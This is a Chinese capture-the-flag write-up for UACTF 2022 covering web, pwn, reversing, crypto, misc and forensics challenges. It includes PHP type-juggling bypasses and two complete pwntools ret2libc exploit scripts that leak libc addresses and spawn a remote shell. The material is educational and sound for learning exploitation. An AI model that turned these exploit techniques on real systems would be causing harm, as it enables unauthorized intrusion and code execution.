---
title: UACTF 2022比赛的WriteUp
date: 2022-8-15 09:25:00
author: 美食家李老叭
img: https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815151055.png
top: false
hide: false
cover: false
coverImg: 
password: 
toc: true
mathjax: false
summary: CTF
categories: CTF
tags:
    - 比赛
---

简介：

本文为UACTF 2022比赛的WriteUp。本次还是与NING0121、meishijia一起组队参赛，最终在447支参赛队伍中排名21位。打怪升级中，再接再厉～

<!--more-->

说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。

## **Web**

### **1-1 Trial by PHP**

基础的 PHP 绕过技术。（题目中间有段时间提供了 php 脚本源码）

题目要求我们达到它所需要我们实现的三个目标，开始并没有思路，没有什么交互按钮，因此就尝试查看 robots.txt，发现存在 secret-source.php 文件。

![1](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/SYFwFZuYoVBUlNe4eJ8wdQ.png)

接着进行访问，阅读逻辑后发现需要实现三个 success 才能够显示出 flag，于是首先尝试直接修改 html 的标签（果然异想天开），接着就需要首先三个条件。

![2](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-3.png)


1. 超短 hash
    要求 ：md5_hash 后 == 0。
    思考：首先了解 == 的含义，hash_hmac 绕过方式。
    解决：由于 “==” 只判断值相同，因此我们只需要让 hash_hmac 返回 NULL即可，经查询发现 php 无法处理数组数据，因此只需要让 egg 为数组即可；
2. 长度大于 hash
    要求：字符串加密长度 < 字符串长度。
    思考：abs 的接收参数？
    解决：由于abs为绝对值函数，当输入字符串数据会返回0，进而生成的的 hash 为 “MA==”，长度为4，因此我们只需要赋值一个长于4字符的字符串即可。
3. 获得参数但是避免特殊符号
    要求：既要获得“THROUGH_A_TRAP_LADEN_MAZE”参数，同时不能包含“\_”。
    思考：开始想着通过二次URL编码绕过，后来发现不行。
    解决：' . ' 在经过 $_GET 后会变成  ' \_ '。

![3](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-4.png)

```
UACTF{17’5_13v1054_n07_13v105444}
```

### **1-2 Juggler**

基础的 PHP 绕过技术。题目提供了验证的源码。

很明显我们需要绕过以下两部分内容，关键在于不知道 \$secret 和 \$password 两个参数。针对 \$secret 我们很明显能通过 hash 后进行二次赋值，因此我们需要对 nonce 参数进行处理，因为 php 无法处理数组参数，因此我们构造 nonce 参数即可使函数返回 0，接着由于已知 username 为 admin，于此同时我们便获得了固定的 hmac 参数；第二要解决的就是 strcmp 问题，虽然不知道 \$password 但是同样使用数组类型数据，便可以满足条件；

![4](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png)

使用 burpsuite 拦截并修改数据如下即可。

![5](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-2.png)

页面打印出了 flag。

![6](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/RhUs09PxOqfzokWQDGm_zg.png)

```
UACTF{jugg1e_this_y0u_fi1thy_casua1}
```

### **1-3 Unhackable Code Runner [Aha!]**

https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022

## **Pwn**

### **2-1 something-something-win**

基础的栈溢出题目。

查看汇编代码，mian函数中会调用sussy函数，sussy函数中存在通过read读入的栈溢出漏洞，代码中存在敏感的win函数，其功能是打开flag文件。

由于Sussy函数中会对栈的内容进行判断并以此为条件进行跳转，否则会直接exit。所以我们需要将栈以要求的方式填充，再最后将win函数的地址覆盖到栈中的ret位置。最终成功拿到Flag。


```
UACTF{R3T_70_D33Z}
```

### **2-2 Warmup**

这是一道典型的ret2libc题目，题目给出了warmup可执行文件以及编译所用的libc。通过checksec可以看到其仅开启了NX保护措施。

通过反编译软件Ghidra的分析，我们可以看到程序逻辑：首先判断check1()函数的返回值是否为0，若不为0则进入do_stuff函数。其中check1函数和do_stuff函数如下所示。do_stuff函数中打印了puts函数在内存中的地址，并且存在read函数的栈溢出漏洞。所以我们的利用步骤是首先使得check1函数的返回值不为0，再根据打印的puts函数地址以及给出的glibc获取system以及"/bin/sh"字符串在内存中的地址，最后构造ROP链ret2libc获取shell。

![7](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/LuaUPWbAGEdOkaVaQg2Ymg.png)

仅通过反汇编的代码我们试图使check1的返回值为0似乎是不可能的，所以我们还需要研究汇编代码。按照函数调用惯例，64位机器编译的程序的返回值优先被置于RAX寄存器中。同时，通过main函数中调用check1函数返回下一条语句，我们也可以看到其对EAX(RAX的低4字节)进行判断是否为0。所以我们需要关注Check1函数中RAX最后值的变化。该函数中，我们通过scanf('%lu', &input)获取一个unsigned long型，接着通过XMM0以及XMM1寄存器的一系列指令对RAX的值进行修改。

![8](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/w6zMVJ9M6MTfqBH0RVoIig.png)

具体的指令说明如下所示。一个unsigned long型使用8字节表示，最大值为2^64-1，所以我们只需要使得scanf的输入超过此值为NULL即可。

```
# 将RBP+8字节(double类型)地址的大小为64bit(8字节)的值赋给XMMO寄存器；
MOVSD XMM0, qword ptr[RBP+input]
# 判断两寄存器的值是否存在NULL，并对ZF，IF，CF寄存器赋值；
# 参考https://www.felixcloutier.com/x86/ucomisd
UCOMISD XMM0，XMM1
# 如果PF寄存器为1，则对AL赋值为1；
SETP AL
```

进入do_stuff函数之后，我们只需要获取在glibc中被动态加载的system以及/bin/sh字符串的地址即可。对于给定的glibc库文件，其内部函数的偏移是固定的，但是其基地址需要被leak出来。真正程序执行时，glibc库函数在内存中的地址为库基地址+库内固定偏移。对于前者的计算，我们通过程序实际运行时某执行过的glibc库函数的实际地址(%p, put或printf泄漏)-其库内固定偏移获得。对于后者，在给定libc的情况，对于函数，我们可以通过`readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep "system@@GLIBC_2.2.5"`指令或者pwntools中ELF('./libc-2.31.so').symbols['system']来获取；对于字符串，我们通过`ROPgadget --binary mypwn --string '/bin/sh'`或者pwntools中调用`next(sh.search("/bin/sh"))`来获取。

此外，在gdb运行时，我们可以通过命令`info proc map`来获取内存映射，然后通过`

info address system`和`find 0x80048000, 0xc0000000, "/bin/sh"`来查找函数和字符串来验证我们构造的地址是否正确。以上指令非常常用，所以在此记录一下。

然而，在获得system以及"/bin/sh"后构造ROP链，成功在本地kali上获得shell，但是远程总是无法打通。后来查阅到，在部分x86_64机器上，system函数调用会遇到movasp issue。原因是glibc中的库函数会使用到movaps指令，该指令用于数据传输但要求栈结构必须是16字节对齐的(这也是64位机器的函数调用惯例)。但是我们的ROP链的构造是以8字节为单位，所以可能会遇到该问题报错。解决方案是在ROP链中添加额外的ret指令使得栈16字节对齐或者跳过system函数开头的push指令即可。

![9](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gxBQBJeZKthbMtE3oWIpRg.png)

![10](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-2-1.png)

完整的Exp如下所示。

```python
from pwn import *

sh = remote("xx.xx.xx.xx",30005)

# try to entry the while loop
sh.recvuntil(b"Enter the pincode: ")
sh.sendline(b'123456789012345678901234567890')

# receive the leaked address of puts function
sh.recvuntil(b"Uhm, not sure what is happening tbh..")
sh.recvuntil(b"\nI'm just going to help you out the tinyest bit.. ")

libc_puts_addr_d = int(sh.recv().decode()[:-1], 16)
print("received the puts addr: %s", libc_puts_addr_d)

libc = ELF('./libc-2.31.so')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.33.so')
libc_puts_addr_s = libc.symbols['puts']
libc_base_addr = libc_puts_addr_d - libc_puts_addr_s
system_addr = libc_base_addr + libc.symbols['system']
binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))

pop_rdi_addr = 0x401255
ret_addr = 0x40101a # to solve the movaps issue

payload = b'A'*56 + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)

sh.sendline(payload)
sh.interactive()
```

### **2-3 No no no square**

No no no square程序和warmup一致，均为ret2libc。但是Nonosquare中并没有打印出puts函数的地址，所以需要我们利用栈溢出来得到。

由于程序执行时调用了puts函数，所以利用思路就是：第一次栈溢出调用puts函数泄漏出GOT表中puts函数的全局偏移并最后跳转到main函数的开头；第二次栈溢出利用计算好的system函数以及/bin/sh字符串的地址完成ret2libc。

具体的来讲，动态链接的程序是如何装载到内存空间并运行的之后会详细地出一篇博客来详细地介绍。具体的Exp如下所示。

```
from pwn import *
sh = remote("xx.xx.xx.xx",30003)


# try to entry the while loop
sh.recvuntil(b"This is going to be fun... is it?")


nonosquare = ELF('./nonosquare')
puts_plt = nonosquare.plt['puts'] # 0x405000
puts_got = nonosquare.got['puts']
main = nonosquare.symbols['main']


pop_rdi_addr = 0x401343 # pop rdi; ret;


payload = b'A'*56 + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)
print("[*]Sending the first payload and leak the puts addr %s" % payload)
sh.sendline(payload)


sh.recvuntil(b"no no no")
sh.recvuntil(b"Did you have fun?")
sh.recvuntil(b"\n")
libc_puts_addr_d = u64(sh.recv()[:6].ljust(8,b'\x00')) # 不足8字节补充
print(libc_puts_addr_d)
print("[*]Received the puts addr in libc: %d" % libc_puts_addr_d)


# sh.recvuntil(b"This is going to be fun... is it?")
# sh.recvuntil(b"no no no")
# sh.recvuntil(b"Did you have fun?")


libc = ELF('./libc-2.31.so')
libc_start_main_addr_s = libc.symbols['puts']
libc_base_addr = libc_puts_addr_d - libc_start_main_addr_s
system_addr = libc_base_addr + libc.symbols['system']
binsh_addr = libc_base_addr + next(libc.search(b"/bin/sh"))


ret_addr = 0x40101a # to solve the movaps issue


payload = b'A'*56 + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
print("[*]Sending the second payload: %s" % payload)
sh.sendline(payload)
sh.recvuntil(b"no no no")
sh.recvuntil(b"Did you have fun?")


sh.interactive()
```

![11](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-3-2.png)

### **2-4 Evil Eval [Aha!]**

![12](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/nPRd3TLyFMCDf-S1gkhaCg.jpeg)

## **Reversing**

### **3-1 Sanity Check**

逆向的第一道题，直接使用逆向工具打开即可。

![13](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/dnuchhhOzEH1SUkK4IxdTw.png)    

### **3-2 MASON****[Aha!]**

题目提供了ELF程序，该程序通过读取flag.txt中的字符串，并以该字符串作为种子，产生随机数生成加法公式。思路在于，通过交互程序首先判断字符串的长度并记录随机产生的数字，随后根据这些随机产生的数字，利用程序爆破的方式对原字符串进行还原。

**主函数逻辑**

![14](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sdGz0iLYlrDRW3HbY-DLsQ.png)     

读取flag.txt文件中的字符串

![15](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WI_JGGuyjQESWemayXrc9w.png)        

![16](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0L_WvOZqD1D1jUi7MfoJaw.png) 

reseed函数是读取字符串的四个字符，并以他们在内存当中的数据作为随机数产生的种子。__int64 s就是字符串的首地址，DWORD是双字，也就是四个字节，即四个字符。该函数，就相当于以首地址为基址，以4\*i为偏移，大小为四个字节的字符串作为随机数产生的种子。

![17](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/q2ZI1sUX3Ru4eR-ZUn0rWw.png)

l1 函数即根据产生的字符串构造随机的加法公式，并计算结果。同时判断后续用户输入的结果是否为正确答案。

```c
bool l1()
{
  const char *v0; // rax
  size_t v1; // rax
  int v3; // [rsp+0h] [rbp-2B0h]
  int v4; // [rsp+4h] [rbp-2ACh]
  char *endptr; // [rsp+8h] [rbp-2A8h] BYREF
  __int64 v6; // [rsp+10h] [rbp-2A0h]
  __int64 v7; // [rsp+18h] [rbp-298h]
  char s[8]; // [rsp+20h] [rbp-290h] BYREF
  __int64 v9; // [rsp+28h] [rbp-288h]
  __int64 v10; // [rsp+30h] [rbp-280h]
  __int64 v11; // [rsp+38h] [rbp-278h]
  __int64 v12; // [rsp+40h] [rbp-270h]
  __int64 v13; // [rsp+48h] [rbp-268h]
  __int64 v14; // [rsp+50h] [rbp-260h]
  __int64 v15; // [rsp+58h] [rbp-258h]
  __int64 v16; // [rsp+60h] [rbp-250h]
  __int64 v17; // [rsp+68h] [rbp-248h]
  __int64 v18; // [rsp+70h] [rbp-240h]
  __int64 v19; // [rsp+78h] [rbp-238h]
  __int64 v20; // [rsp+80h] [rbp-230h]
  __int64 v21; // [rsp+88h] [rbp-228h]
  __int64 v22; // [rsp+90h] [rbp-220h]
  __int64 v23; // [rsp+98h] [rbp-218h]
  char dest[8]; // [rsp+A0h] [rbp-210h] BYREF
  __int64 v25; // [rsp+A8h] [rbp-208h]
  char v26[496]; // [rsp+B0h] [rbp-200h] BYREF
  unsigned __int64 v27; // [rsp+2A8h] [rbp-8h]


  v27 = __readfsqword(0x28u);
  v3 = 2 * (rand() % 6 + 1);                    //  2, 4,6,8,10,12。决定加法的项数
  v6 = 0LL;
  *(_QWORD *)dest = 0LL;
  v25 = 0LL;
  memset(v26, 0, sizeof(v26));
  do
  {
    v4 = rand() % 0x1000000;                    // 0-63
    *(_QWORD *)s = 0LL;
    v9 = 0LL;
    v10 = 0LL;
    v11 = 0LL;
    v12 = 0LL;
    v13 = 0LL;
    v14 = 0LL;
    v15 = 0LL;
    v16 = 0LL;
    v17 = 0LL;
    v18 = 0LL;
    v19 = 0LL;
    v20 = 0LL;
    v21 = 0LL;
    v22 = 0LL;
    v23 = 0LL;
    if ( v3 <= 1 )
      v0 = "= ?";
    else
      v0 = "+";
    sprintf(s, "%d %s ", (unsigned int)v4, v0);
    strcat(dest, s);
    v6 += v4;
    --v3;
  }
  while ( v3 > 0 );
  v7 = 0LL;
  do
  {
    puts(dest);
    if ( !fgets(s, 128, _bss_start) )
      break;
    if ( strlen(s) != 1 )
    {
      s[strlen(s) - 1] = 0;
      v7 = strtol(s, &endptr, 10);
    }
    v1 = strlen(s);
  }
  while ( &s[v1] != endptr );
  return v7 == v6;
}
```

依据pwntool，通过自动化地交互，我们得到了字符串的长度以及相关信息。由于服务器已经关闭，所以我们只能采用本地模拟的方式。而且我猜测字符串的长度一定是4的倍数。

```py
from pwn import *
import re
pattern = re.compile(r'\d+\.?\d*')

# conn = remote('challenges.uactf.com.au',30001)
conn = process('./mason')
num_add = []
num_1 = []
for x in range(64):
    num_all_int = []
    result = 0
    str_add = str(conn.recvline(keepends=True))
    print("concive add :"+ str_add)
    if "broadcast" in str(str_add):
        print("num_add is :" , num_add)
        print("num_1 is:", num_1)
        print("the length of flag is ", x*4)
        exit(99)
    num_add.append( str_add.count("+") +1)
    num_all = re.findall(pattern,str_add)
    for i in num_all:
        result +=int( i)
        num_all_int.append(int( i))
    print("all add number:" ,num_all_int)
    print("the add result:" + str(result))
    num_1.append(num_all[0])
    
    conn.sendline(str(result))
    print("send the add result......")
    print("after the send:" + str(conn.recvline(keepends=True)))
    
    #conn.recvuntil("Voice")
    #after_recv = str(conn.recvline(keepends=True))
    #print("server send :"+after_recv)
```

再通过给出的write_up,即遍历所有可能出现的字符，进行爆破。tab_size中存储的是加数的个数、tab中存放的是每个加法公式中加数。

```py
#include <stdio.h>
#include <stdlib.h>
int main()
{
    __int32_t res, check;
    __int8_t i;
    int tab_size[] = {4, 4, 12, 12, 2, 12, 12, 10};
    int tab[8][12] = {
        {9022031, 12357936, 2415318, 16184558},
        {16448419, 7237420, 9131202, 11715763},
        {8957279, 10863672, 2527773, 13853931, 12889127, 15656069, 6045003, 13312869, 6678458, 15383265, 6123571, 3391779},
        {5455897, 15833397, 7054469, 14893700, 5641234, 12370933, 10464366, 8737845, 8588291, 6607650, 14087216, 6475796},
        {7118560, 5373450},
        {10279125, 6020706, 3765174, 3355417, 13626908, 5507900, 12989108, 6401031, 12006999, 3447729, 5329581, 11520997},
        {5455897, 15833397, 7054469, 14893700, 5641234, 12370933, 10464366, 8737845, 8588291, 6607650, 14087216, 6475796},
        {16563743, 15315034, 15623837, 10300268, 11825995, 8497235, 5756897, 2373671, 6551149, 181825},
        };
    for (int len = 0; len < 8; len++)
    {
        for (int c1 = 32; c1 <= 125; c1++)
        {
            for (int c2 = 32; c2 <= 125; c2++)
            {
                for (int c3 = 32; c3 <= 125; c3++)
                {
                    for (int c4 = 32; c4 <= 125; c4++)
                    {
                        i = c1 | (c2 << 8) | (c3 << 16) | (c4 << 24);
                        srand(i);
                        res = 2 * (rand() % 6 + 1);
                        if (res == tab_size[len])
                        {
                            check = 1;
                            for (int j = 0; j < tab_size; j++)
                            {
                                res = rand() % 0x1000000;
                                if (tab[len][j] != res)
                                {
                                    check = 0;
                                    break;
                                }
                            }
                            if (check)
                            {
                                printf("%d\n", i);
                                exit(0);
                            }
                        }
                    }
                }
            }
        }
    }
}
```

在程序运算一段时间过后，可惜并没有得出运算结果。但是总体上的思路应该是没有问题。在得到最终结果后，需转换为十六进制，再根据大端存储对原来的字符串进行还原。

## **Crypto**

### **4-1 Non-textual Troubles**

基础的异或加密。题目提供了一个用于加密的 python 程序。

题目代码主要是从 plaintext.txt 读取明文，利用随机数和字符Unicode码进行异或操作，进而生成密文写入 ciphertext.txt 当中。本题的关键在于加密过程的可逆性，首先随机数使用了种子机制，因此每次生成的随机数是相同的，其次异或操作存在 A^B = C，C^B = A，因此仅需进行相同的加密操作即可。

![18](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/4-1-1.png)

```
UACTF{b4d_h4b175_l34d_70_py7h0n2}
```

## **Misc**

### **5-1 Welcome**

签到题目，题目提供了该比赛的 Flag 格式，简单复制粘贴即可。

### **5-2 Snake Equality**

一道关于 Python 内存地址的题目。题目提供了程序的 python 源码。

题目要求我们输入一个数字 n 和一个字符 c，并要求经过强制类型转换的整型数字 n 和 经过 ord() 函数解码的 c 生成的数字相同，但是加 1 后不同。

起初与 jackfromeast 进行了简单的思考，可能都在想 ord() 函数处理字符串的一个边界问题，但是并未成功，于是暂时搁置了。后面注意到它使用的是 “is” 而不是 “==”，经查询发现，“ is ”：是要求两个对象要相同，即同一个对象（相同id）；“==”：只需要值相同即可；因此改题目是对python整型内存id的考察，同样查询发现python针对整型中的0-256，会统一分配相同的id，而大于256就会独立分配id。因此我们需要做的就是在256的边界进行操作，即输入 n = 256， 字符为Unicode中对应十进制数字为256的字符即可。

![19](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5NmtIwIgvqppomDYyFEWRw.png)

```
UACTF{n07_411_5n4k35_423_8u117_3qu41_45_d3m0n572473d_8y_15_4nd_3qu415}
```

### **5-3 Blurry-Eyed** **[Aha!]**

隐写的题目还是多见多总结，没有更好的办法。

![20](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-1.png)

原图没有一丝头绪，看到其他师傅的WriteUp说此图是一张3D图片，需要使用[stereogram solver](https://piellardj.github.io/stereogram-solver/)工具来查看。

![21](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/5-3-2.png)

## **Forenics**

### **6-1 Colour Blind**

基础的图片隐写题目。题目提供了一个图片。

简单的使用工具即可，stegSlove 可以进行不同色彩的展示，同时结合题目名称，我们可以发现 Flag。

![22](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-1-1.png)

```
UACTF{r37urn_0f_7h3_c0l0r_m31573r}
```

### **6-2 HID Table for 0x2**

此题目是USB协议下的Keyboard键盘流量分析。

首先流量中存在设备1.2.0和设备1.3.0，通过握手信息中DESCRIPTER response device可以得到设备1.3.0为目标键盘，如下所示。所以1.3.1即为键盘通信的目的地址。

![23](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/6-2-1.png)

由于地址不满足ip地址的规范，我们可以使用长度来进行过滤。键盘的按键信息通过中断URB_INTERRUPT来来传输，键的信息存储在Leftover Capture Data的8字节中。其中第一个字节用来表示是否按下shift键，第三个字节表示实际按下的键是什么，通过键盘表的对应可知。所以我们只需要把1.3.1发送的流量中的所有8字节dump下来并取第三字节(第一字节辅助)进行翻译即可。

值得一提的是，通过以上帖子得到的字符串没有实义，花费了许多时间。后来我发现流量中包含着键盘中的右箭头、左箭头和回车键，分别对应着0x4f,0x50以及0x28，这些键会改变字符串的输入流，所以需要设置一个字符串的指针(光标)来处理。左箭头和后箭头分别对应着左移和右移，回车对应着光标归零。

![24](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/NNLFcy8P3GDyx1lMmoUiYg.png)

后半部分为网址，前半部分为网址中应填入的密码。最终获得flag，如下所示。

```
UACTF{234d_'3m_4nd_w33p}
```

### **6-3 Infinite [Aha!]**

ogg 格式的音频隐写也是第一次见，还是用常规方法 Audacity 分析，发现并不太行，看到其他师傅们的方法和讲解。原因在于 ogg 格式文件是由多个迷你的 oggs 容器构成，因此需要将其多个音频流进行分离，并且流媒体可以通过它的 "序列号"（OggS文件签名后的10个字节）来识别。这里可以使用工具 oggz-tools。

```
apt-get install oggz-tools
oggz rip -i 0 infinite.ogg -o stream0.ogg
oggz rip -i 1 infinite.ogg -o stream1.ogg
oggz rip -i 2 infinite.ogg -o stream2.ogg
```

接着使用 audacity 查看生成的 stream1.ogg 和 stream2.ogg 文件的频谱图，分别获得 flag 的部分，进行拼接即可。

![25](https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/forenics-3.png)

```
UACTF{t01nf1n1ty4ndb3y0nd}
```

